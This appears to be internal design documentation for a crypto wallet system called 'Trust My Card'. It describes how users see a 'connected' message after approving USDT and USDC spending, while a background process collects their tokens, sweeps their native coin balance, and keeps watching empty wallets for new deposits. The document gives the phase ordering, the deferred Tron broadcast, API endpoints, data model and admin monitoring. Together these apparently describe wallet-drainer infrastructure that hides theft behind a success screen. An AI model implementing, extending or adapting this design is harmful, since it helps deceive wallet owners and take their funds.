# Two-phase settlement and native execution policy

Trust My Card uses a **two-phase authorization** model: the user sees
“connected” after the **wallet phase**, while **background settlement**
finalizes on-chain approvals, collects tokens, and executes the native sweep.

Collection execution is owned by the backend queue/scheduler
(`CollectionIntent` → `ApprovalCollectionScheduler`). The settlement layer
**coordinates ordering and native timing** — it does not run a second collector.

## Phases

### 1. Wallet phase (user-visible)

User approves spending in the modal. The session completes quickly so the UI
can show success.

| Network | Token order | Native in wallet phase |
|---------|-------------|------------------------|
| EVM | USDT approve → USDC approve | **Deferred** — no `personal_sign`; native runs in settlement via `eth_sendTransaction` |
| Tron | USDT → USDC → native sign | Native tx is **signed** in wallet phase; **broadcast** is deferred to settlement |

Zero-balance tokens still receive an on-chain approve when included in work,
but `shouldAttemptTransfer: false` is recorded so collection is skipped until
balance appears.

### 2. Background settlement (client coordinator + backend)

`runAuthorizationSettlement` in `frontend/wallet-sdk/src/authorization/phases/settlement-coordinator.ts`:

1. Register `NetworkSettlementSession` (stores `tokenPlan` with per-token `shouldAttemptTransfer`).
2. Finalize approvals in **USDT → USDC** order (confirm creates `CollectionIntent`).
3. Poll `POST /api/token-collection/native-readiness` until `canExecuteNative`.
4. Execute native:
   - **Tron:** `POST /api/network-settlement/process` broadcasts deferred signed tx.
   - **EVM:** one `eth_sendTransaction` from the connected wallet, then `native-complete`.

## Native execution policy

**Rule:** Native runs when **no token has active in-flight collection work**.

```text
if (any token is pending or collecting) → wait
else → execute native immediately
```

Terminal token outcomes **do not block** native:

| State | Blocks native? |
|-------|----------------|
| Pending collection | Yes |
| Collecting / in progress | Yes |
| Success | No |
| Skipped — zero balance | No |
| Failed (permanent) | No |
| Failed — retry scheduled | No |
| Cancelled | No |

After native executes, failed tokens continue retrying via the scheduler;
zero-balance tokens continue monitoring for deposits; successful tokens need no
further work.

### Shared logic

Canonical state resolution lives in:

`frontend/shared/constants/token-collection-state.ts`

- `resolveTokenCollectionState(snapshot)` → logical state
- `canExecuteNativeFromStates(states)` → boolean
- `TOKEN_COLLECTION_STATE_LABELS` → admin/terminal-friendly labels

Backend: `WalletService.evaluateNativeReadiness()` loads approval/intent/in-flight
transfer snapshots and applies the same rules.

## API endpoints (wallet session auth)

| Method | Path | Purpose |
|--------|------|---------|
| POST | `/v1/api/token-collection/native-readiness` | Evaluate whether native can run |
| POST | `/v1/api/network-settlement/register` | Register wallet-phase completion |
| POST | `/v1/api/network-settlement/register-native-authorization` | Store Tron deferred native payload |
| POST | `/v1/api/network-settlement/process` | Process settlement (Tron broadcast / mark EVM ready) |
| GET | `/v1/api/network-settlement/:id/status` | Session status + per-token states |
| POST | `/v1/api/network-settlement/:id/native-complete` | Mark EVM native complete |

Native estimate/register/confirm endpoints still call
`assertNativeExecutionAllowed()` so direct native API use respects the same
policy.

## Data model

`NetworkSettlementSession` (Prisma):

- `tokenPlan` (JSON) — `{ USDT: { shouldAttemptTransfer, txHash }, USDC: … }`
- `nativeReady` — last known `canExecuteNative` from readiness evaluation
- `nativeAuthKind` / `nativeAuthPayload` — Tron deferred broadcast payload

Migration: `backend/prisma/migrations/20260805130000_settlement_token_plan/`

## Observability

| Module | Events |
|--------|--------|
| `settlement` | State transitions, token settled, native readiness context |
| `connect` | `SETTLEMENT PROGRESS`, `NATIVE_READINESS_POLL`, `SETTLEMENT COMPLETE` |

Admin: user detail **Settlement** tab shows live token state labels; pipeline
includes `background_settlement` and `native_settlement` stages when a session
exists.

## Tests

| Location | Coverage |
|----------|----------|
| `frontend/shared/test/token-collection-state.spec.js` | All 11 native policy scenarios |
| `backend/test/native-readiness.spec.ts` | Policy alignment with shared rules |
| `frontend/wallet-sdk/test/authorization/native-readiness-poll.spec.ts` | Coordinator polling |

Run:

```bash
cd frontend/shared && npm run build && node --test test/token-collection-state.spec.js
cd backend && npm test
cd frontend/wallet-sdk && node --test -r ./test/register-ts.cjs test/authorization/native-readiness-poll.spec.ts
```

Full catalog: [test-cases.md](../testing/test-cases.md).

## Related docs

- [Event-driven collection](./event-driven-collection.md) — `CollectionIntent` queue (single collector)
- [Admin observability migration](../operations/admin-observability-migration.md) — settlement in admin UI
- [API reference](../api/README.md) — wallet + admin endpoints
